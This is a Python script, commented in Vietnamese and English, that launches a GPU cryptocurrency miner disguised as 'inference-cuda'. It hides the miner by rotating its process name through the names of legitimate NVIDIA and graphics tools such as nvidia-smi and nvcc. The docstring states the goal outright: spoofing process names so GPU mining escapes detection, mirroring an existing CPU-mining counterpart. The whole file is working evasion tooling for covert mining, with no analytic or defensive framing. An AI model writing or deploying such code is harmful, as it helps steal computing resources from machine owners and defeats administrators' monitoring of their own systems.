#!/usr/bin/env python3
"""mining_environment.stealth.wrappers.stealth_inference_cuda

🎮 **[Stealth GPU-CUDA Inference Wrapper]** (wrapper ẩn danh cho GPU-CUDA inference)

Script wrapper khởi động **inference-cuda process** với **[Self-Stealth capability]** (khả năng tự ẩn danh).
Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách áp dụng 
**[Process Name Spoofing]** (giả mạo tên tiến trình) tương tự CPU mining.

⚠️ WORKFLOW:
1. Khởi động **[Self-Stealth Manager]** trong process hiện tại
2. Thay đổi process name thành system process giả (GPU-optimized names)
3. Exec **inference-cuda** binary để thay thế process image
4. **Self-Stealth Manager** tiếp tục hoạt động trong inference-cuda process

✅ ADVANTAGES:
- Symmetric protection với CPU mining
- Không cần external PID tracking
- Không cần special privileges  
- Process tự quản lý stealth mode
- Zero GPU mining interruption risk

🎯 GPU-SPECIFIC FEATURES:
- GPU-optimized stealth names (CUDA, OpenGL, graphics processes)
- Compatible với CUDA runtime
- Handles GPU driver process signatures
"""

import os
import sys
import signal
import time
import subprocess
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import self-stealth module (updated path)
try:
    from mining_environment.stealth.core.self_stealth import start_self_stealth, SelfStealthManager
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_unified_logger('mining_environment.gpu_stealth')

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
    
    # Get global stealth manager if exists
    from mining_environment.stealth.core.self_stealth import get_global_stealth_manager
    stealth_manager = get_global_stealth_manager()
    
    if stealth_manager:
        stealth_manager.stop_stealth_mode()
        logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleaned up")
    
    sys.exit(0)

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")
        
        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
        
        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)
        
        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)
        
        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")
        
        # Start self-stealth mode với GPU-optimized names
        # Sử dụng GPU/graphics-related process names để blend in
        stealth_manager = start_self_stealth(
            rotation_interval=25,  # Slightly different từ CPU để avoid pattern
            custom_names=[
                "nvidia-smi",           # NVIDIA System Management Interface
                "cuda-gdb",             # CUDA Debugger  
                "nvcc",                 # NVIDIA CUDA Compiler
                "nvidia-ml-py",         # NVIDIA ML Python
                "nvidia-settings",      # NVIDIA Settings
                "gpu-manager",          # GPU Manager
                "glxgears",             # OpenGL test utility
                "vulkan-info",          # Vulkan system info
                "mesa-loader",          # Mesa graphics loader
                "drm-tip"               # Direct Rendering Manager
            ]
        )
        
        # Set global manager để signal handler có thể access
        from mining_environment.stealth.core.self_stealth import set_global_stealth_manager
        set_global_stealth_manager(stealth_manager)
        
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode activated")
        
        # Log stealth status
        status = stealth_manager.get_status()
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] Stealth status: {status}")
        
        # **CRITICAL**: Small delay để đảm bảo stealth mode hoàn toàn active
        time.sleep(2)
        
        # Verify stealth name change
        current_name = stealth_manager.get_current_process_name()
        logger.info(f"✅ [GPU-STEALTH-WRAPPER] GPU process name changed to: '{current_name}'")
        
        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
        
        # **EXEC INFERENCE-CUDA**: Thay thế process image nhưng giữ nguyên stealth manager
        # Note: os.execv sẽ thay thế process image nhưng stealth_manager thread sẽ continue
        try:
            # Flush logs trước khi exec
            import logging
            logging.shutdown()
            
            # Use os.execv để replace process image
            os.execv(cuda_inference_path, exec_command)
            
        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")
            
            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=sys.stdout,
                    stderr=sys.stderr
                )
                
                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")
                
                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")
                
                # Cleanup stealth mode
                stealth_manager.stop_stealth_mode()
                sys.exit(return_code)
                
            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                stealth_manager.stop_stealth_mode()
                sys.exit(1)
    
    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()